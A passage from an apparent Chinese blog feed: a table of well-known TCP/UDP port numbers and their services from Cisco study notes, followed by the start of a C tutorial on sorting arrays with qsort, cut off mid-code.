href="https://zh.wikipedia.org/wiki/Telnet">Telnet</a>协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">109/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/郵局協定">邮局协议</a>（POP），第2版</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">110/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/郵局協定">邮局协议</a>，第3版 -用于接收<a href="https://zh.wikipedia.org/wiki/电子邮件">电子邮件</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">111/TCP,UDP</td><td style="text-align: center;">Sun远程过程调用协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">113/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=Ident_protocol&amp;action=edit&amp;redlink=1">Ident</a>- 旧的服务器身份识别系统，仍然被<a href="https://zh.wikipedia.org/wiki/IRC">IRC</a>服务器用来认证它的用户</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">115/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/简单文件传输协议">简单文件传输协议</a></td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">117/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/UUCP">UNIX间复制协议</a>（<strong>U</strong>nixto <strong>U</strong>nix <strong>C</strong>opy<strong>P</strong>rotocol，UUCP）的路径确定服务</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">118/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/SQL">SQL</a>服务</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">119/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/网络新闻传输协议">网络新闻传输协议</a>- 用来收取新闻组的消息</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">123/UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/網絡時間協議">NTP</a>（Network TimeProtocol） - 用于时间同步</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">135/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/分散式運算環境">分布式运算环境</a>（DistributedComputing Environment，DCE）终端解决方案及定位服务</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">135/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/微软">微软</a>终端映射器（End PointMapper，EPMAP）</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">137/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/NetBIOS">NetBIOS</a> NetBIOS名称服务</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">138/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/NetBIOS">NetBIOS</a> NetBIOS数据报文服务</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">139/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/NetBIOS">NetBIOS</a> NetBIOS会话服务</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">143/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/因特网信息访问协议">因特网信息访问协议</a>（IMAP）- 用于检索<a href="https://zh.wikipedia.org/wiki/电子邮件">电子邮件</a></td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">152/TCP,UDP</td><td style="text-align: center;">BFTP, 后台文件传输程序</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">153/TCP,UDP</td><td style="text-align: center;">简单网关监控协议（<a href="https://zh.wikipedia.org/w/index.php?title=Simple_Gateway_Monitoring_Protocol&amp;action=edit&amp;redlink=1">SimpleGateway Monitoring Protocol</a>，SGMP）</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">156/TCP,UDP</td><td style="text-align: center;">SQL服务</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">158/TCP,UDP</td><td style="text-align: center;">DMSP, 分布式邮件服务协议</td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">161/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/简单网络管理协议">简单网络管理协议</a>（SNMP)</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">162/TCP,UDP</td><td style="text-align: center;">SNMP协议的TRAP操作</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">170/TCP</td><td style="text-align: center;">打印服务</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">179/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/边界网关协议">边界网关协议</a>(BGP)</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">194/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/IRC">IRC</a>（互联网中继聊天）</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">201/TCP,UDP</td><td style="text-align: center;">AppleTalk 路由维护</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">209/TCP,UDP</td><td style="text-align: center;">Quick Mail 传输协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">213/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/互联网分组交换协议">互联网分组交换协议</a>（IPX）</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">218/TCP,UDP</td><td style="text-align: center;">MPP，信息发布协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">220/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/因特网信息访问协议">因特网信息访问协议</a>（IMAP），第3版</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">259/TCP,UDP</td><td style="text-align: center;">ESRO, Efficient Short RemoteOperations</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">264/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=Border_Gateway_Multicast_Protocol&amp;action=edit&amp;redlink=1">BGMP</a>，边界网关多播协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">308/TCP</td><td style="text-align: center;">Novastor 在线备份</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">311/TCP</td><td style="text-align: center;">Apple 服务器管理员工具、工作组管理</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">318/TCP,UDP</td><td style="text-align: center;">TSP，<a href="https://zh.wikipedia.org/w/index.php?title=时间戳协议&amp;action=edit&amp;redlink=1">时间戳协议</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">323/TCP,UDP</td><td style="text-align: center;">IMMP, Internet消息映射协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">383/TCP,UDP</td><td style="text-align: center;">HP OpenView HTTPs 代理程序</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">366/TCP,UDP</td><td style="text-align: center;">ODMR，按需邮件传递</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">369/TCP,UDP</td><td style="text-align: center;">Rpc2 端口映射</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">371/TCP,UDP</td><td style="text-align: center;">ClearCase 负载平衡</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">384/TCP,UDP</td><td style="text-align: center;">一个远程网络服务器系统</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">387/TCP,UDP</td><td style="text-align: center;">AURP，AppleTalk 升级用路由协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">389/TCP,UDP</td><td style="text-align: center;">轻型目录访问协议 LDAP</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">401/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/不间断电源">不间断电源</a>（UPS）</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">411/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=Direct_Connect_network&amp;action=edit&amp;redlink=1">DirectConnect</a> Hub 端口</td><td style="text-align: center;">非官方</td></tr><tr class="even"><td style="text-align: center;">412/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=Direct_Connect_network&amp;action=edit&amp;redlink=1">DirectConnect</a> 客户端—客户端 端口</td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">427/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/服務定位協定">服务定位协议</a>（SLP）</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">443/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/超文本传输安全协议">超文本传输安全协议</a>或<a href="https://zh.wikipedia.org/wiki/QUIC">QUIC</a></td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">444/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=Simple_Network_Paging_Protocol&amp;action=edit&amp;redlink=1">SNPP</a>，简单网络分页协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">445/TCP</td><td style="text-align: center;">Microsoft-DS (<a href="https://zh.wikipedia.org/wiki/Active_Directory">ActiveDirectory</a>、Windows 共享、<a href="https://zh.wikipedia.org/wiki/震盪波蠕蟲">震荡波蠕虫</a>、Agobot、Zobotworm)</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">445/UDP</td><td style="text-align: center;">Microsoft-DS <a href="https://zh.wikipedia.org/wiki/伺服器訊息區塊">服务器消息块</a>（SMB）文件共享</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">464/TCP,UDP</td><td style="text-align: center;">Kerberos 更改/设定密码</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">465/TCP</td><td style="text-align: center;">Cisco 专用协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">465/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/傳輸層安全性協定">传输层安全性协议</a>加密的<a href="https://zh.wikipedia.org/wiki/简单邮件传输协议">简单邮件传输协议</a></td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">475/TCP</td><td style="text-align: center;">tcpnethaspsrv（<a href="https://zh.wikipedia.org/w/index.php?title=Hasp&amp;action=edit&amp;redlink=1">Hasp</a>服务，TCP/IP 版本）</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">497/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=Retrospect&amp;action=edit&amp;redlink=1">dantz</a>备份服务</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">500/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/網路安全關聯與金鑰管理協定">网络安全关系与密钥管理协议</a>，IKE-Internet密钥交换</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">502/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/Modbus">Modbus</a> 协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">512/TCP</td><td style="text-align: center;">exec，远程进程执行</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">512/UDP</td><td style="text-align: center;">comsat 和 <a href="https://zh.wikipedia.org/w/index.php?title=Biff_(電腦運算)&amp;action=edit&amp;redlink=1">biff</a>命令：用于电子邮件系统</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">513/TCP</td><td style="text-align: center;">login，登录命令</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">513/UDP</td><td style="text-align: center;">Who命令，查看当前登录计算机的用户</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">514/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/远程外壳">远程外壳</a> protocol -用于在远程计算机上执行非交互式命令，并查看返回结果</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">514/UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/Syslog">Syslog</a> 协议 -用于远程日志</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">515/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=Line_Printer_Daemon_protocol&amp;action=edit&amp;redlink=1">LinePrinter Daemon protocol</a> - 用于 LPD 打印机服务器</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">517/UDP</td><td style="text-align: center;">Talk</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">518/UDP</td><td style="text-align: center;">NTalk</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">520/TCP</td><td style="text-align: center;">efs</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">520/UDP</td><td style="text-align: center;">Routing - <a href="https://zh.wikipedia.org/wiki/路由信息协议">路由信息协议</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">513/UDP</td><td style="text-align: center;">路由器</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">524/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/NetWare核心協定">NetWare核心协议</a>（NetWare核心协议）用于一系列功能，例如访问NetWare主服务器资源、同步时间等</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">525/UDP</td><td style="text-align: center;">Timed，时间服务</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">530/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/远程过程调用">远程过程调用</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">531/TCP,UDP</td><td style="text-align: center;">AOL 即时通信软件, IRC</td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">532/TCP</td><td style="text-align: center;">netnews</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">533/UDP</td><td style="text-align: center;">netwall，用于紧急广播</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">540/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/UUCP">UUCP</a>（Unix-to-Unix复制协议）</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">542/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/商业">商业</a>（CommerceApplications）</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">543/TCP</td><td style="text-align: center;">klogin，Kerberos登陆</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">544/TCP</td><td style="text-align: center;">kshell，Kerberos 远程shell</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">546/TCP,UDP</td><td style="text-align: center;">DHCPv6客户端</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">547/TCP,UDP</td><td style="text-align: center;">DHCPv6服务器</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">548/TCP</td><td style="text-align: center;">通过传输控制协议（TCP）的 Appletalk文件编制协议（AFP(<a href="https://zh.wikipedia.org/wiki/苹果归档协议">苹果归档协议</a>))</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">550/UDP</td><td style="text-align: center;">new-rwho，new-who</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">554/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/即時串流協定">即时流协议</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">556/TCP</td><td style="text-align: center;">Brunhoff 的远程文件系统（RFS）</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">560/UDP</td><td style="text-align: center;">rmonitor, Remote Monitor</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">561/UDP</td><td style="text-align: center;">monitor</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">563/TCP,UDP</td><td style="text-align: center;">通过<a href="https://zh.wikipedia.org/wiki/TLS">TLS</a>的<a href="https://zh.wikipedia.org/wiki/网络新闻传输协议">网络新闻传输协议</a>（NNTPS）</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">587/TCP</td><td style="text-align: center;">邮件消息提交（<a href="https://zh.wikipedia.org/wiki/简单邮件传输协议">简单邮件传输协议</a>，<a href="https://tools.ietf.org/html/rfc2476">RFC 2476</a>）</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">591/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/FileMaker">FileMaker</a>6.0（及之后版本）网络共享（HTTP的替代，见80端口）</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">593/TCP,UDP</td><td style="text-align: center;">HTTP RPC Ep Map（RPC over HTTP, oftenused by <a href="https://zh.wikipedia.org/wiki/Distributed_COM">Distributed COM</a>services and <a href="https://zh.wikipedia.org/wiki/Microsoft_Exchange_Server">MicrosoftExchange Server</a>）</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">604/TCP</td><td style="text-align: center;">TUNNEL</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">631/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/互聯網列印協定">互联网打印协议</a></td><td style="text-align: center;"></td></tr><tr class="odd"><td style="text-align: center;">636/TCP,UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/轻型目录访问协议">LDAP</a> over <a href="https://zh.wikipedia.org/wiki/传输层安全协议">TLS</a>（加密传输，也被称为LDAPS）</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">639/TCP,UDP</td><td style="text-align: center;">MSDP，<a href="https://zh.wikipedia.org/wiki/组播源发现协议">组播源发现协议</a></td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">646/TCP,UDP</td><td style="text-align: center;">LDP，标签分发协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">647/TCP</td><td style="text-align: center;">DHCP故障转移协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">648/TCP</td><td style="text-align: center;">RRP（Registry RegistrarProtocol），注册表注册协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">652/TCP</td><td style="text-align: center;">DTCP（Dynamic Tunnel ConfigurationProtocol），<a href="https://zh.wikipedia.org/wiki/动态主机设置协议">动态主机设置协议</a></td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">654/UDP</td><td style="text-align: center;">AODV（Ad hoc On-Demand DistanceVector），<a href="https://zh.wikipedia.org/wiki/无线自组网按需平面距离矢量路由协议">无线自组网按需平面距离向量路由协议</a></td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">665/TCP</td><td style="text-align: center;">sun-dr, Remote DynamicReconfiguration</td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">666/UDP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/毁灭战士">毁灭战士</a>，电脑平台上的一系列<a href="https://zh.wikipedia.org/wiki/第一人称射击游戏">第一人称射击游戏</a>。</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">674/TCP</td><td style="text-align: center;">ACAP（Application Configuration AccessProtocol），应用配置访问协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">691/TCP</td><td style="text-align: center;">MS Exchange Routing</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">692/TCP</td><td style="text-align: center;">Hyperwave-ISP</td><td style="text-align: center;"></td></tr><tr class="odd"><td style="text-align: center;">694/UDP</td><td style="text-align: center;">用于带有高可用性的聚类的心跳服务</td><td style="text-align: center;">非官方</td></tr><tr class="even"><td style="text-align: center;">695/TCP</td><td style="text-align: center;">IEEE-MMS-SSL</td><td style="text-align: center;"></td></tr><tr class="odd"><td style="text-align: center;">698/UDP</td><td style="text-align: center;">OLSR（Optimized Link StateRouting），优化链路状态路由协议</td><td style="text-align: center;"></td></tr><tr class="even"><td style="text-align: center;">699/TCP</td><td style="text-align: center;">Access Network</td><td style="text-align: center;"></td></tr><tr class="odd"><td style="text-align: center;">700/TCP</td><td style="text-align: center;">EPP, 可扩展供应协议</td><td style="text-align: center;"></td></tr><tr class="even"><td style="text-align: center;">701/TCP</td><td style="text-align: center;">LMP,链路管理协议</td><td style="text-align: center;"></td></tr><tr class="odd"><td style="text-align: center;">702/TCP</td><td style="text-align: center;">IRIS over BEEP</td><td style="text-align: center;"></td></tr><tr class="even"><td style="text-align: center;">706/TCP</td><td style="text-align: center;">SILC，Secure Internet LiveConferencing</td><td style="text-align: center;"></td></tr><tr class="odd"><td style="text-align: center;">711/TCP</td><td style="text-align: center;">TDP，标签分发协议</td><td style="text-align: center;"></td></tr><tr class="even"><td style="text-align: center;">712/TCP</td><td style="text-align: center;">TBRPF，Topology Broadcast based onReverse-Path Forwarding</td><td style="text-align: center;"></td></tr><tr class="odd"><td style="text-align: center;">720/TCP</td><td style="text-align: center;">SMQP，Simple Message Queue Protocol</td><td style="text-align: center;"></td></tr><tr class="even"><td style="text-align: center;">749/TCP,UDP</td><td style="text-align: center;">kerberos-adm，Kerberosadministration</td><td style="text-align: center;"></td></tr><tr class="odd"><td style="text-align: center;">750/UDP</td><td style="text-align: center;">Kerberos version IV</td><td style="text-align: center;"></td></tr><tr class="even"><td style="text-align: center;">782/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=Conserver&amp;action=edit&amp;redlink=1">Conserver</a>serial-console management server</td><td style="text-align: center;"></td></tr><tr class="odd"><td style="text-align: center;">829/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/证书管理协议">证书管理协议</a>（CMP）[<a href="https://zh.wikipedia.org/zh-cn/TCP/UDP端口列表#cite_note-rfc4210-2">2]</a></td><td style="text-align: center;"></td></tr><tr class="even"><td style="text-align: center;">860/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/ISCSI">ISCSI</a>，Internet小型计算机系统接口</td><td style="text-align: center;"></td></tr><tr class="odd"><td style="text-align: center;">873/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/Rsync">Rsync</a>，文件同步协议</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">901/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/Samba">Samba</a>网络管理工具（SWAT）</td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">902</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/VMware">VMware</a>服务器控制台[<a href="https://zh.wikipedia.org/zh-cn/TCP/UDP端口列表#cite_note-3">3]</a></td><td style="text-align: center;">非官方</td></tr><tr class="even"><td style="text-align: center;">904</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/VMware">VMware</a>服务器替代（如果902端口已被占用）</td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">911/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/w/index.php?title=Network_Console_on_Acid&amp;action=edit&amp;redlink=1">NetworkConsole on Acid</a>（NCA） - local <a href="https://zh.wikipedia.org/wiki/Linux">tty</a> redirection over <a href="https://zh.wikipedia.org/wiki/OpenSSH">OpenSSH</a></td><td style="text-align: center;"></td></tr><tr class="even"><td style="text-align: center;">981/TCP</td><td style="text-align: center;"><a href="https://zh.wikipedia.org/wiki/Check_Point">Check Point</a> RemoteHTTPS management for firewall devices running embedded <a href="https://zh.wikipedia.org/w/index.php?title=Checkpoint_Firewall-1&amp;action=edit&amp;redlink=1">CheckpointFirewall-1</a> software</td><td style="text-align: center;">非官方</td></tr><tr class="odd"><td style="text-align: center;">989/TCP,UDP</td><td style="text-align: center;">FTP Protocol (data) over TLS/SSL</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">990/TCP,UDP</td><td style="text-align: center;">FTP Protocol (control) over TLS/SSL</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">991/TCP,UDP</td><td style="text-align: center;">NAS (Netnews Admin System)</td><td style="text-align: center;"></td></tr><tr class="even"><td style="text-align: center;">992/TCP,UDP</td><td style="text-align: center;">基于TLS/SSL的Telnet协议</td><td style="text-align: center;">官方</td></tr><tr class="odd"><td style="text-align: center;">993/TCP</td><td style="text-align: center;">基于 <a href="https://zh.wikipedia.org/wiki/傳輸層安全性協定">传输层安全性协议</a>的<a href="https://zh.wikipedia.org/wiki/因特网信息访问协议">因特网信息访问协议</a>(加密传输)</td><td style="text-align: center;">官方</td></tr><tr class="even"><td style="text-align: center;">995/TCP</td><td style="text-align: center;">基于 <a href="https://zh.wikipedia.org/wiki/傳輸層安全性協定">传输层安全性协议</a>的<a href="https://zh.wikipedia.org/wiki/郵局協定">邮局协议</a>(加密传输)</td><td style="text-align: center;">官方</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 思科人才孵化项目笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思科 </tag>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C qsort的应用</title>
      <link href="/2022/04/06/c-qsort-de-ying-yong/"/>
      <url>/2022/04/06/c-qsort-de-ying-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="c中qsort的应用">C中qsort的应用</h1><p>使用<code>qsort</code>的起因是锐格并不支持C++库文件，手敲排序又很麻烦。</p><h2 id="介绍">介绍</h2><p><code>void qsort(void *arr, size_t n, size_t size, int (*cmp)(const void *, const void *))</code></p><ul><li><code>arr</code> 表示要排序的序列，可以是数组名或指针</li><li><code>n</code> 表示arr中有多少待排序的元素</li><li><code>size</code>表示arr中单个元素的大小（如果是动态分配内存的序列要注意）</li><li><code>cmp</code> 表示自定义的比较函数</li></ul><h3 id="cmp函数">cmp函数</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里要注意的是，<code>cmp</code>入参的a和b，是<code>arr</code>中的元素，即如果<code>arr</code>是数组，则a、b表示指向数组中某个元素的指针，如果<code>arr</code>是二维数组（数组的数组），则a、b表示指向arr中某个数组的指针</p><p>列举一下有哪些情况会用到<code>qsort</code></p><ol type="1"><li>整数类：一维数组（动态分配内存的一维数组/指针）、简单二维数组（动态分配内存的二维数组/二维指针，m<em>2）、复杂二维数组（m</em>n）</li><li>字符串类：单一字符串、字符串数组</li><li>数据结构类：数据结构数组</li></ol><p>注：以下所有排序均为<strong>升序（从小到大）</strong>，若要降序排序，把cmp中a、b颠倒即可</p><h2 id="一维数组动态分配内存的一维数组指针">1.一维数组（动态分配内存的一维数组/指针）</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>a <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span>  <span class="token comment">/* a、b分别指向arr1/arr2中某个元素 */</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> arr1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token 